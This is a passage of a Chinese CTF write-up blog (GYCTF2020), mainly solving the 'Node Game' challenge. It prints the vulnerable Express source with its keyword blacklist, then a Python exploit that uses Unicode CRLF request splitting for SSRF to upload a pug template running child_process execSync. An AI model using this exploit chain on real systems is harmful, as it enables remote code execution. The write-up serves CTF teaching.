<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/202003151150596.png" alt="在这里插入图片描述"></p>
<p>所以访问<code>/runtime/session/sess_1111111111111111111111111111.php</code>就是我们写入的文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315120918971.png" alt="在这里插入图片描述"></p>
<p>然后就是bypass disable functions了，直接上传&lt;php7.4的通杀POC执行&#x2F;readflag即可：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315121416838.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h1><blockquote>
<p>首先放上出题人的<a target="_blank" rel="noopener" href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">writeup。</a></p>
</blockquote>
<p>这题给了源码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">multer</span>(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).<span class="title function_">array</span>(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">morgan</span>(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/uploads&quot;</span>,express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/template&quot;</span>,express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.<span class="property">query</span>.<span class="property">action</span>?req.<span class="property">query</span>.<span class="property">action</span>:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || action.<span class="title function_">includes</span>(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.<span class="title function_">renderFile</span>(file);</span><br><span class="line">    res.<span class="title function_">send</span>(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.<span class="property">msg</span>=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span>, <span class="keyword">function</span>(<span class="params">err, data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">mimetype</span> +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">originalname</span></span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.<span class="title function_">mkdirSync</span>(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.<span class="property">msg</span> = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    <span class="attr">msg</span>: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    <span class="attr">filename</span>: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/core&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = <span class="title function_">blacklist</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url, <span class="keyword">function</span>(<span class="params">resp</span>) &#123;</span><br><span class="line">                    resp.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.<span class="property">code</span> === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.<span class="title function_">toString</span>();</span><br><span class="line">                         res.<span class="title function_">send</span>(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.<span class="title function_">send</span>(e.<span class="property">message</span>);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">blacklist</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.<span class="title function_">includes</span>(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>大概看一下几个路由：</p>
<ul>
<li>&#x2F;：会包含&#x2F;template目录下的一个pug模板文件来用pub进行渲染</li>
<li>&#x2F;source：回显源码</li>
<li>&#x2F;file_upload：限制了只能由127.0.0.1的ip进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录</li>
<li>&#x2F;core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。</li>
</ul>
<p>根据上面几点，可以大致判断是利用SSRF伪造本地ip进行文件上传，上传包含命令执行代码的pug文件（可以搜一下pug文件的代码格式）到&#x2F;template目录下，然后用<code>?action=</code>来包含该文件。</p>
<p>现在问题就是如何用SSRF来进行文件上传，这里就是Node js的编码处理安全问题，可以参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>
<p>如果对编码经过精心的构造，就可以通过拆分请求实现的SSRF攻击（也就是一种CRLF注入），通过换行让服务端将我们的第一次请求下面构造的报文内容，当作一次单独的HTTP请求，而这个构造的请求就是我们的文件上传请求了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315164810466.png" alt="在这里插入图片描述"><br>由上面文章中的内容可知，通常的换行<code>\r\n（%0D%0A）</code>，我们可以构造为<code>\u010D\u010A</code>。<br>同理其他的一些特殊字符，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p>
<p>根据这个编码方式，就可以构造出拆分的请求从而SSRF了，参考<a target="_blank" rel="noopener" href="http://iv4n.cc/2020-wp-vol1/#xctf%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB">iv4n的exp</a>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.<span class="built_in">format</span>(<span class="built_in">len</span>(body), body) \</span><br><span class="line">    .replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;\u012b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>)    \</span><br><span class="line">    .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\u0a27&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\u015b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\u015d&#x27;</span>) \</span><br><span class="line">    + <span class="string">&#x27;GET&#x27;</span> + <span class="string">&#x27;\u0120&#x27;</span> + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">&#x27;http://5750e068-33b5-4a65-a6bf-82412fdee97e.node3.buuoj.cn/core?q=&#x27;</span> + payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.get(</span><br><span class="line">    <span class="string">&#x27;http://5750e068-33b5-4a65-a6bf-82412fdee97e.node3.buuoj.cn/?action=lethe&#x27;</span>).text)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315171235568.png" alt="在这里插入图片描述"></p>
<br>


<p>参考：<br><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">新春战疫公益赛-ezsqli-出题小记</a><br><a target="_blank" rel="noopener" href="http://iv4n.cc/2020-wp-vol1/">http://iv4n.cc/2020-wp-vol1/</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/2020/0306/GYCTF2020-Writeup/">https://lethe.site/2020/0306/GYCTF2020-Writeup/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/0324/bypass-apostrophe-ctf-sqli-learn/">通过两道CTF题学习过滤单引号的SQL注入</a>
            
            
            <a class="next" rel="next" href="/2020/0303/GXYCTF2019-GWCTF2019-Writeup/">GXYCTF2019&GWCTF2019——Writeup</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>